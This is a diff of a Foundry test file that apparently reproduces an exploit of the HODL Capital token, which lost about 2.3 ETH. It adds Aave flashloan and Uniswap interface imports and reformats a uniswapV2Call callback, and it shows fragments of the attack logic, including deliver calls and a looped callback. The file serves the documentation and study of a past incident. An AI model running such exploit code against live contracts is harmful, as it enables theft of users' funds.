@@ -3,6 +3,12 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IAaveFlashloan} from "src/interfaces/IAaveFlashloan.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // @KeyInfo -- Total Lost : ~2.3 ETH
 // Attacker : https://etherscan.io/address/0x4e998316ec31d2f3078f8f57b952bfae54728be1
 // Attack Contract : https://etherscan.io/address/0x6943e74d1109a728f25a2e634ba3d74e9e476aed
@@ -208,9 +214,15 @@ contract HODLCapitalExploit is Test {
         hodl.deliver((amount1000 * v0) / 1000);
     }
 
-    function uniswapV2Call(address, /*sender*/ uint256, /*amount0*/ uint256, /*amount1*/ bytes calldata /*data*/ )
-        external
-    {
+    function uniswapV2Call(
+        address,
+        /*sender*/
+        uint256,
+        /*amount0*/
+        uint256,
+        /*amount1*/
+        bytes calldata /*data*/
+    ) external {
         if (times > 5) {
             if (times <= 25) {
                 uint256 pairBalance = hodl.balanceOf(address(hodl_weth));
